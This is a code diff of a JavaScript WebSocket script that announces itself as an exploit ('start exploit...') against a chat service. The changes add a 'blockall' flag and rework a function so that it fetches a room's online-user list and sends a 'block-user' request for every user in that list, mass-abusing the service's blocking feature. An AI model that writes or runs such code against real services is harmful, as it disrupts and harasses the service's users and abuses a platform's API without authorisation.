@@ -18,6 +18,7 @@ Released under the MIT license: http://jsbin.mit-license.org
     console.log("start exploit...");
     const MSG = "Mazhai :P";
     const ROOM = "kudumi";
+	  var blockall = false;
     var guest = false;
     var allok = false;
     var guestname = "Dragon";
@@ -56,7 +57,7 @@ Released under the MIT license: http://jsbin.mit-license.org
       }
     if(dataType=="onliners"){
 	    if(jsonData.data.onliners){
-		    jsonData.data.onliners.forEach((i)=>ws.send(JSON.stringify({"type":"block-user","data":{"username":i.username}})));
+		    if(blockall) jsonData.data.onliners.forEach((i)=>ws.send(JSON.stringify({"type":"block-user","data":{"username":i.username}})));
 	    }			
       }
     }
@@ -83,15 +84,14 @@ Released under the MIT license: http://jsbin.mit-license.org
        	ws.send(JSON.stringify({"type":"block-user","data":{"username":"sam londonn"}}));
        }
     }
-    fetch_room = () => {
+    fetch_room = (r) => {
 	     if(ws.OPEN){
-       	ws.send(JSON.stringify({"type":"fetch","data":{"room":ROOM}}));
+       	ws.send(JSON.stringify({"type":"fetch","data":{"room":r}}));
        }
     }
     self_blocker = () => {
-    	 if(ws.OPEN){
-       	ws.send(JSON.stringify({"type":"block-user","data":{"username":"sam londonn"}}));
-       }
+    	blockall = true;
+	    fetch_room(ROOM);
     }
     ws.onopen = () => {
       initsession();
